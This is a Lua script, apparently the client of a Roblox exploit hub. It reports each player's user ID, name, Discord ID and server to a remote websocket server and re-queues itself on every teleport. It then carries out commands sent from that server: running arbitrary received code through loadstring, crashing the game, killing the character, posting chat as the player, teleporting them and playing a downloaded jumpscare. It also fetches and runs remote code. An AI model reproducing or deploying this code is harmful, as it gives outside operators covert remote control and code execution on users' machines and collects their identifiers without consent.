local queuetp = queue_on_teleport or queueonteleport or function(v) end

queuetp('loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/MaxhubControlPanel/main/client.lua",true))()')

if getgenv().oldws then
	getgenv().forceClosing = true
	getgenv().oldws:Close()
end
getgenv().forceClosing = false
-- Services / Variables
local connectionManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/EXT/main/connections.lua", true))().new("MaxhubServerStuff")
local localPlayer = game:GetService("Players").LocalPlayer
local httpService = game:GetService("HttpService")

local BASE_URL = "testserver-diki.onrender.com"
-- local BASE_URL = "localhost:3001"

local ws = nil

-- Our connection data
local userdata = {
	action = "newuser",
	userid = localPlayer.UserId,
	username = localPlayer.Name,
	discordid = LRM_LinkedDiscordID or "No Discord Linked",
	placeid = game.PlaceId,
	jobid = game.JobId,
	gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
	executor = identifyexecutor and identifyexecutor() or "Unknown",
}

-- GLOBAL CHAT
local devs = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/MaxhubControlPanel/refs/heads/main/MAXHUBSUPERDEVSIGMAS"))() or { 332721249, 213207428, 7012855056, 7098987458, 2283397273 }
local isDev = table.find(devs, localPlayer.UserId)

local GlobalChat = {}
GlobalChat.__index = GlobalChat

function GlobalChat.init()
	if not isDev then return end -- DEV TESTING
	local self = setmetatable({}, GlobalChat)

	self.ScreenGui = game:GetObjects("rbxassetid://110126484672625")[1]

	self.ScreenGui.Parent = gethui and gethui() or game:GetService("CoreGui")

	self.Drag = self.ScreenGui["Main/Drag"]
	self.Main = self.Drag.Main
	self.MessageHolder = self.Main.ScrollingFrame
	self.MessageBox = self.Main.Messagebox

	connectionManager:NewConnection(self.MessageBox.FocusLost, function(enterPressed, inputObject)
		warn("Sending message...")
		if enterPressed then
			local message = self.MessageBox.Text

			if message == "" or not message:match("%S") then
				return
			end

			if self.SendMessageDebounce then
				coroutine.wrap(function()
					self.MessageBox.Text = "On Cooldown!"
					task.wait(0.5)
					self.MessageBox.Text = ""
				end)()
				return
			end

			self:SendMessage(message, isDev and "Dev" or "Roblox")
			self.MessageBox.Text = ""
		end
	end)

	self.RobloxChatTemplate = self.MessageHolder.Roblox

	local temp = self.RobloxChatTemplate:Clone()
	self.RobloxChatTemplate:Destroy()
	self.RobloxChatTemplate = temp

	self.DiscordChatTemplate = self.MessageHolder.Discord

	temp = self.DiscordChatTemplate:Clone()
	self.DiscordChatTemplate:Destroy()
	self.DiscordChatTemplate = temp

	self.DevChatTemplate = self.MessageHolder.Dev

	temp = self.DevChatTemplate:Clone()
	self.DevChatTemplate:Destroy()
	self.DevChatTemplate = temp

	self.msgTypes = {
		Roblox = self.RobloxChatTemplate,
		Discord = self.DiscordChatTemplate,
		Dev = self.DevChatTemplate,
	}

	self.LastMessage = nil
	self.LastMessageSent = false

	self.SendMessageDebounce = false

	return self
end

function GlobalChat:fetchMessages()
	local response = request({
		Url = `{BASE_URL:find("localhost") and "http" or "https"}://{BASE_URL}/messages`,
		Method = "GET",
	})

	if response.StatusCode == 200 then
		local data = httpService:JSONDecode(response.Body)
		return data.messages
	end

	return "Failed to fetch messages"
end

function GlobalChat:addMessage(msg: string, type: "Roblox" | "Discord" | "Dev", sender: string)
	assert(self.msgTypes[type], "Invalid message type")

	local message = self.msgTypes[type]:Clone()

	msg = msg:sub(1, 64)

	if type == "Roblox" then
		message.Text = `{sender}: {msg}`
	else
		message.Text = `{type} [{sender}]: {msg}`
	end

	message.Visible = true
	message.Parent = self.MessageHolder

	return message
end

function GlobalChat:SendMessage(msg: string, type: "Roblox" | "Discord" | "Dev")
	if not ws or self.SendMessageDebounce then
		return
	end

	self.SendMessageDebounce = true

	ws:Send(httpService:JSONEncode({
		action = "send_msg",
		chat_msg = msg,
		chat_type = type,
	}))

	local message = self:addMessage(msg, type, localPlayer.Name)

	task.delay(3, function()
		if not self.LastMessageSent then
			message:Destroy()
		else
			self.LastMessageSent = false
		end
		self.SendMessageDebounce = false
	end)
end

-- END GLOBAL CHAT

local function sendCmdResponse(receiver, success, response)
	request({
		Url = `{BASE_URL:find("localhost") and "http" or "https"}://{BASE_URL}/sendres`,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
		},
		Body = httpService:JSONEncode({
			sender = localPlayer.Name,
			receiver = receiver,
			success = success,
			response = response,
			id = httpService:GenerateGUID(false),
		}),
	})
end

-- Commands
local commands = {
	kill = function(sender, _)
		local success, message = pcall(function()
			local character = localPlayer.Character
			if not character then
				return "Character not found"
			end

			local humanoid = character:FindFirstChildWhichIsA("Humanoid")
			if not humanoid then
				return "Humanoid not found"
			end

			if humanoid.Health <= 0 then
				return "Character is already dead"
			end

			humanoid.Health = 0

			return "Killed successfully"
		end)

		if success then
			sendCmdResponse(sender, true, message)
		else
			sendCmdResponse(sender, false, "Error: " .. tostring(message))
		end
	end,

	say = function(sender, args)
		local chatService = game:GetService("TextChatService")

		if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
			local generalChannel = chatService.TextChannels.RBXGeneral
			generalChannel:SendAsync(args.Message)
		else
			local sayMessageRequest = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
			sayMessageRequest:FireServer(args.Message, "All")
		end

		sendCmdResponse(sender, true, "Successfully sent message")
	end,

	jumpscare = function(sender, args)
		-- coroutine.wrap(function()
		if not writefile or not getcustomasset or not request then
			sendCmdResponse(sender, false, "Executor not supported")
			return
		end
		sendCmdResponse(sender, true, "Successfully executed jumpscare")

		writefile("scream.mp3", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3", Method = "GET" }).Body)

		writefile("skibidi.webm", request({ Url = `https://github.com/Grayy12/maxhubassets/raw/main/{args.type == "balls" and "balls" or "skibidi"}.webm`, Method = "GET" }).Body)

		local items = {
			["_ScreenGui"] = Instance.new("ScreenGui"),
			["_VideoFrame"] = Instance.new("VideoFrame"),
		}

		items["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		items["_ScreenGui"].Parent = (gethui and gethui()) or game:GetService("CoreGui")

		items["_VideoFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
		items["_VideoFrame"].Position = UDim2.new(0.5, 0, 0.5, 0)
		items["_VideoFrame"].Size = UDim2.new(1, 0, 1, 0)
		items["_VideoFrame"].ZIndex = 9999
		items["_VideoFrame"].Parent = items["_ScreenGui"]
		items["_VideoFrame"].Video = getcustomasset("skibidi.webm", true)

		local sound = Instance.new("Sound", workspace)
		sound.SoundId = getcustomasset("scream.mp3", true)
		sound.Volume = 0.5
		sound:Play()

		items["_VideoFrame"].Looped = false
		items["_VideoFrame"]:Play()

		items["_VideoFrame"].Ended:Wait()

		items["_ScreenGui"]:Destroy()
		delfile("scream.mp3")
		delfile("skibidi.webm")

		sendCmdResponse(sender, true, "jumpscare ended")
		-- end)()
	end,

	teleport = function(sender, args)
		sendCmdResponse(sender, true, "Successfully joined place")
		if args.JobId then
			game:GetService("TeleportService"):TeleportToPlaceInstance(args.PlaceId, args.JobId, localPlayer)
		else
			game:GetService("TeleportService"):Teleport(args.PlaceId, localPlayer)
		end
	end,

	execute = function(sender, args)
		xpcall(function()
			loadstring(args.Code)()
			sendCmdResponse(sender, true, "Successfully executed code")
		end, function(err)
			sendCmdResponse(sender, false, err)
		end)
	end,

	crash = function(sender, args)
		sendCmdResponse(sender, true, "Successfully crashed")
		while true do
		end
	end,

	bring = function(sender, args)
		local player = game:GetService("Players"):FindFirstChild(args.Username)

		if not player then
			return sendCmdResponse(sender, false, "Player not in game")
		end

		if not player.Character then
			return sendCmdResponse(sender, false, "Player has no character")
		end

		localPlayer.Character:PivotTo(player.Character:GetPivot())

		sendCmdResponse(sender, true, "Successfully brought player")
	end,
}

-- Global Chat Init
local GlobalChatInstance = nil

-- WebSocket Client
local function connectToServer()
	ws = WebSocket.connect(`{BASE_URL:find("localhost") and "ws" or "wss"}://{BASE_URL}/ws`)
	getgenv().oldws = ws

	-- Send user data so the server knows who we are
	ws:Send(httpService:JSONEncode(userdata))

	ws:Send(httpService:JSONEncode({ action = "send_msg", chat_msg = "Successfully connected to server" }))

	-- Listen for messages
	connectionManager:NewConnection(ws.OnMessage, function(msg)
		local data = httpService:JSONDecode(msg)

		local action = data.action
		local cmd = data.cmd
		local sender = data.sender
		local args = data.args

		if action == "run" and commands[cmd] then
			coroutine.wrap(pcall)(commands[cmd], sender, args)
		end

		if action == "ping" then
			ws:Send(httpService:JSONEncode({ action = "pong" }))
		end

		if action == "msg_received" then
			GlobalChatInstance:addMessage(data.message, data.msgType, data.sender)
		end

		if action == "msg_sent" then
			GlobalChatInstance.LastMessageSent = true
		end
	end)

	GlobalChatInstance = GlobalChat.init()

	-- Listen for close
	connectionManager:NewConnection(ws.OnClose, function()
		if not getgenv().forceClosing then
			pcall(connectToServer)
		end
	end)
end

pcall(connectToServer)

return GlobalChatInstance
